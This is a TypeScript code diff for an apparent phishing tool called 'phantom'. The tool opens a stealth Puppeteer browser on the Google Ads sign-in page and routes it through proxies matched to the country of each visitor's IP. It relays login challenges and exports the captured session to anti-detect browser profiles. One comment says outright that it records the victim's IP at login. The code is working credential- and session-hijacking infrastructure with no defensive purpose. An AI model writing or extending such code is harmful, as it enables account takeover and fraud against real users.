@@ -7,10 +7,6 @@ const TARGET_URL =
   process.env.PHANTOM_TARGET_URL ??
   "https://accounts.google.com/signin/v2/identifier?service=adwords&continue=https://ads.google.com/";
 
-// ── AdsPower ──────────────────────────────────────────────────────────────────
-const ADSPOWER_URL = process.env.ADSPOWER_URL ?? "http://127.0.0.1:50325";
-const ADSPOWER_GROUP_NAME = process.env.ADSPOWER_GROUP ?? "Google Ads";
-// ─────────────────────────────────────────────────────────────────────────────
 
 // ── Proxy SOCKS5 — configurar no .env ────────────────────────────────────────
 const PROXY_HOST = process.env.PROXY_HOST;
@@ -74,7 +70,7 @@ type GeoInfo = { countryCode: string; city: string };
 
 async function geolocateIp(ip: string): Promise<GeoInfo> {
   try {
-    const res = await fetch(`http://ip-api.com/json/${ip}?fields=countryCode,city`, { signal: AbortSignal.timeout(4000) });
+    const res = await fetch(`http://ip-api.com/json/${ip}?fields=countryCode,city`, { signal: AbortSignal.timeout(2000) });
     const data = await res.json() as { countryCode?: string; city?: string };
     return { countryCode: data.countryCode ?? "", city: data.city ?? "" };
   } catch {
@@ -108,27 +104,27 @@ async function launchBrowserForSession(sessionId: string, userIp?: string): Prom
   const executablePath = findChrome();
   if (!executablePath) throw new Error("Chrome não encontrado");
 
-  // Geo-proxy: ajusta localização do proxy para corresponder ao IP do usuário
-  // IPRoyal: sufixo de país vai no PASSWORD (_country-br), não no username
-  let proxyPass = PROXY_PASS ?? "";
-  if (PROXY_ENABLED && PROXY_PASS && userIp) {
-    const geo = await geolocateIp(userIp);
-    if (geo.countryCode) {
-      proxyPass = buildProxyPass(PROXY_PASS, geo);
-      console.log(`[phantom] geo proxy: ${userIp} → ${geo.countryCode} → pass suffix: _country-${geo.countryCode.toLowerCase()}`);
-    }
-  }
-
   const proxyArg = PROXY_ENABLED ? [`--proxy-server=http://${PROXY_HOST}:${PROXY_PORT}`] : [];
 
+  // Geo e launch do Chrome em paralelo — geo só é necessário no page.authenticate()
   console.log("[phantom] launching Chrome for session", sessionId, "at:", executablePath);
-  const browser = await puppeteer.launch({
-    headless: shouldRunHeadless(),
-    executablePath,
-    defaultViewport: null,
-    ignoreDefaultArgs: ["--enable-automation"],
-    args: chromeLaunchArgs(proxyArg),
-  });
+  const [browser, proxyPass] = await Promise.all([
+    puppeteer.launch({
+      headless: shouldRunHeadless(),
+      executablePath,
+      defaultViewport: null,
+      ignoreDefaultArgs: ["--enable-automation"],
+      args: chromeLaunchArgs(proxyArg),
+    }),
+    (async () => {
+      if (!PROXY_ENABLED || !PROXY_PASS || !userIp) return PROXY_PASS ?? "";
+      const geo = await geolocateIp(userIp);
+      if (!geo.countryCode) return PROXY_PASS;
+      const pass = buildProxyPass(PROXY_PASS, geo);
+      console.log(`[phantom] geo proxy: ${userIp} → ${geo.countryCode} → pass suffix: _country-${geo.countryCode.toLowerCase()}`);
+      return pass;
+    })(),
+  ]);
   console.log("[phantom] Chrome launched for session", sessionId);
 
   store.browsers.set(sessionId, browser);
@@ -847,19 +843,9 @@ export async function phantomSelectMethod(sessionId: string, challengeType: stri
 async function saveToAdsPower(page: Page, sessionId: string, session: import("@/lib/demo-session").DemoSession | null): Promise<void> {
   const email = session?.emailPreview ?? "unknown";
   try {
-    console.log("[adspower] starting saveToAdsPower for", email);
+    console.log("[dolphin] starting saveToDolphin for", email);
 
-    // "Verificação de API" desligada no AdsPower → sem auth necessária
-    // Se ativada no futuro, adicionar header: Authorization: <API_KEY>
-
-    // 1. Buscar group_id pelo nome
-    const groupUrl = `${ADSPOWER_URL}/api/v1/group/list?group_name=${encodeURIComponent(ADSPOWER_GROUP_NAME)}`;
-    const groupRaw = await fetch(groupUrl).then((r) => r.text());
-    const groupData = JSON.parse(groupRaw) as { code?: number; msg?: string; data?: { list?: { group_id: string; group_name: string }[] } };
-    const groupId = groupData?.data?.list?.[0]?.group_id ?? "0";
-    console.log("[adspower] group_id:", groupId);
-
-    // 2. Capturar IP público do Chrome (= IP da vítima no momento do login)
+    // 1. Capturar IP público do Chrome (= IP da vítima no momento do login)
     let victimIp = "";
     try {
       await page.goto("https://api.ipify.org?format=json", { waitUntil: "domcontentloaded", timeout: 8000 });
